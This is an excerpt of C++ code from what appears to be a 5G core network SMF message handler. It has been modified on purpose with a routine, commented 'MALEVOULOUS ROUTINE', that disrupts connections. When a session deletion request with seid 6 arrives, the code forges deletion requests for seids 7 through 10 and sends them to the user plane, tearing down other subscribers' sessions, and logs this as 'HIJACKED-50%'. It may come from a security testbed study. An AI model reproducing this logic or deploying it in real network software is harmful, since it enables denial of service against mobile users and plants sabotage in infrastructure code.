    ...
    switch (msg->msg_type) {
      ...
      case N4_SESSION_DELETION_REQUEST:
        if (itti_n4_session_deletion_request* m =
          ...
          //MODIFIED BY LELE ON 2024-06-20 , ON 2024-06-24, ON 2024-07-24
          //SMF that disrupts 50% of connections

          //CASE T=10 ; M=5; trigger_i=6
          if (m->seid == 6) {
            //MALEVOULOUS ROUTINE 
            //OLD: int seid_array[10] = {0xb, 0xc, 0xd, 0xe, 0xf, 0x10, 0x11, 0x12, 0x13, 0x14};
            int seid_array[4] = {7, 8, 9, 10};
            z = 0;

            for(z=0; z<4; z++) {
                m->seid = (seid_t) seid_array[z];
                Logger::smf_n4().info("[HIJACKED-50%] (T=10) %d MODIFIED SESSION DELETION REQUEST with seid %d", z, m->seid);
                smf_n4_inst->send_n4_msg(ref(*m)); 
            }
